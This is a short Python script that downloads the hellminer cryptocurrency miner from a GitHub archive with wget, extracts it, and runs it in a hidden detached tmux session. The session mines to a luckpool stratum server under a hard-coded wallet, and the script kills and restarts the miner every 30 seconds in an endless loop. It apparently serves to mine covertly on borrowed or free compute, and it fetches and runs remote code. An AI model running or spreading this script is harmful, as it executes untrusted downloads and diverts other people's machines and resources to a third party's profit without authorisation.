import os
import time
jalan=1
cmd = 'wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz && tar -xvf hellminer_cpu_linux.tar.gz'
os.system(cmd)
while jalan==1:
    cmdd = 'tmux new-session -d ./hellminer -c stratum+tcp://ap.luckpool.net:3956#xnsub -u R9xxUMZVYD386zWtvG2hUzdMt6rjWkEbxC.jagohash -p x --cpu 2'
    os.system(cmdd)
    time.sleep(30)
    cmddd = 'killall verus-solver && killall hellminer'
    os.system(cmddd)
    time.sleep(1)